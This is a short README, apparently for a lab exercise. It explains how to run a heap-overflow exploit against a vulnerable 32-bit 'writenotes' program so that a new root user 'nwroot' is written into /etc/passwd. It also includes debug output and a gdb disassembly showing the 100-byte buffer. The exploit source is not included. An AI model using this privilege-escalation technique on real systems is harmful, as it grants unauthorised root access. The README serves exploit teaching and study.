# How to use
1. Exploit only works on 32bit Linux Systems
2. chmod +x writenotes && chmod +x exploit
3. ./exploit ./writenotes writenotes
4. cat /etc/passwd
   - You'll see a new root user has been created call
   nwroot. Login:
     - su nwroot
     - password
5. You now got root as a local user by exploiting the heap

# How we noticed the overflow
1. root:~# ./writenotes "testnotes"
   - [DEBUG] buffer   @ 0x8a3c160: 'testnotes'
   - [DEBUG] datafile @ 0x8a3c1d0: '/var/notes'
   - [DEBUG] file descriptor is 3
   - Note has been saved.

2. root:~# gdb ./writenotes
   - (gdb) disas main
   - (gdb) 0x08048854 <+23>:	push   $0x64
           0x08048856 <+25>:	call   0x80486e2 <ec_malloc>

- this means the variable that holds the string to send to /var/notes
is allocated 0x64 bytes == malloc(100)
